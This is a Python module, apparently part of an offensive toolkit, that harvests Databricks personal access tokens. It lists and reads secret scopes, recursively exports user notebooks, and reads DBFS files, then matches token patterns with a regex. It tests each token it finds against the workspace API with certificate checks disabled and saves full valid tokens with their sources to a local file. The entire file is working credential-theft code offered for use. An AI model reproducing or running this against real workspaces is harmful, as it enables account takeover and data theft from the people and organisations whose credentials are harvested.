import re
import requests
import base64
from core.utils import get, safe_json
from config import workspace_url, log

TOKEN_REGEX = re.compile(r"(?i)(dapi[a-z0-9]{32,})")

def extract_tokens_from_secrets():
    log("[*] Scanning secrets for tokens...")
    found_tokens = []
    scopes_url = f"{workspace_url}/api/2.0/secrets/scopes/list"
    scopes = safe_json(get(scopes_url)).get("scopes", [])

    for scope in scopes:
        scope_name = scope.get("name")
        keys_resp = get(f"{workspace_url}/api/2.0/secrets/list", params={"scope": scope_name})
        keys = safe_json(keys_resp).get("secrets", [])

        for key_entry in keys:
            key = key_entry["key"]
            secret_resp = get(f"{workspace_url}/api/2.0/secrets/get", params={"scope": scope_name, "key": key})
            value = safe_json(secret_resp).get("value", "")
            for match in TOKEN_REGEX.finditer(value):
                token = match.group(1)
                found_tokens.append({"token": token, "source": f"secret:{scope_name}/{key}"})
    return found_tokens

def extract_tokens_from_notebooks(path="/Users"):
    log("[*] Scanning notebooks for tokens...")
    found_tokens = []
    list_url = f"{workspace_url}/api/2.0/workspace/list"
    export_url = f"{workspace_url}/api/2.0/workspace/export"
    objects = safe_json(get(list_url, params={"path": path})).get("objects", [])

    for obj in objects:
        if obj["object_type"] == "DIRECTORY":
            found_tokens.extend(extract_tokens_from_notebooks(path=obj["path"]))
        elif obj["object_type"] == "NOTEBOOK":
            r = get(export_url, params={"path": obj["path"], "format": "SOURCE"})
            content = safe_json(r).get("content", "")
            if content:
                decoded = base64.b64decode(content).decode("utf-8", errors="ignore")
                for match in TOKEN_REGEX.finditer(decoded):
                    token = match.group(1)
                    found_tokens.append({"token": token, "source": f"notebook:{obj['path']}"})
    return found_tokens

def extract_tokens_from_dbfs(path="/tmp"):
    log("[*] Scanning DBFS for tokens...")
    found_tokens = []
    list_url = f"{workspace_url}/api/2.0/dbfs/list"
    read_url = f"{workspace_url}/api/2.0/dbfs/read"
    files = safe_json(get(list_url, params={"path": path})).get("files", [])

    for f in files:
        if f.get("is_dir"):
            found_tokens.extend(extract_tokens_from_dbfs(f["path"]))
        else:
            path_value = f["path"]
            read_resp = get(read_url, params={"path": path_value})
            content = safe_json(read_resp).get("data", "")
            if content:
                try:
                    decoded = base64.b64decode(content).decode("utf-8", errors="ignore")
                    for match in TOKEN_REGEX.finditer(decoded):
                        token = match.group(1)
                        found_tokens.append({"token": token, "source": f"dbfs:{path_value}"})
                except Exception as e:
                    log(f"[!] Failed to decode {path_value}: {e}", level="error")
    return found_tokens

def validate_token(token):
    try:
        resp = requests.get(f"{workspace_url}/api/2.0/token/list", headers={"Authorization": f"Bearer {token}"}, verify=False)
        if resp.status_code == 200:
            log(f"[+] Token valid: {token[:10]}... ({len(token)} chars)")
            return True
        else:
            log(f"[-] Invalid token: {token[:10]}... Status: {resp.status_code}")
    except Exception as e:
        log(f"[!] Error validating token: {e}", level="error")
    return False

def relay_tokens():
    log("[*] Starting token relay module...")
    results = []
    tokens = (
        extract_tokens_from_secrets()
        + extract_tokens_from_notebooks()
        + extract_tokens_from_dbfs()
    )

    for item in tokens:
        token = item["token"]
        source = item["source"]
        valid = validate_token(token)
        results.append({"token": token, "source": source, "valid": valid})

    with open("token_relay_results.json", "w") as f:
        f.write(str(results))
    log("[+] Results written to token_relay_results.json")
